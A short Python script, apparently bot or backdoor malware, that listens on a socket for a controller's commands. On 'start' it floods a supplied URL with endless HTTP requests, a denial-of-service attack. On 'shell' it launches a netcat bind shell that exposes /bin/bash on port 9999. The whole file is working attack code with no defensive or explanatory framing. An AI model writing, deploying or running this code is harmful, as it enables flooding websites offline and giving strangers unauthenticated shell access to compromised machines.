import socket, os, requests, subprocess, threading

ip = '10.9.1.23'
port = 6667

count = 0
def doz(url):
	print("attacking:"+url)
	try:
		while True:
			r = requests.get(url)
			global count
			count+=1
			print(f"[{count}]:{url}|{r.status_code}")

	except:
		pass


def c_listen():
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	con, adr = s.accept()
	print(adr,' is connected!')
	url = ''

	while True:
		cmd = con.recv(1024).decode()
		if cmd == 'gg':
			con.send(f'connection closed from {ip}'.encode())
			con.close()
			break
		elif cmd == 'start':
			url = con.recv(1024).decode()
			while True:
				threading.Thread(target=doz(url)).start()
				try:
					if con.recv(1024).decode() == "stop":
						con.close()
						break
				except:
					pass

		elif cmd == 'shell':
			#con.send('shell command not working yet but you can do net bind shell ;)')
			con.send('connected!'.encode())
			os.system('nc -e /bin/bash -lvnp 9999 &')
			#con.send('zhell'.encode())
			#cmd = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
			#con.send(cmd.stdout.read())
			#con.send(cmd.stderr.read())
		else:
			con.send('command not found!'.encode())

	


c_listen()
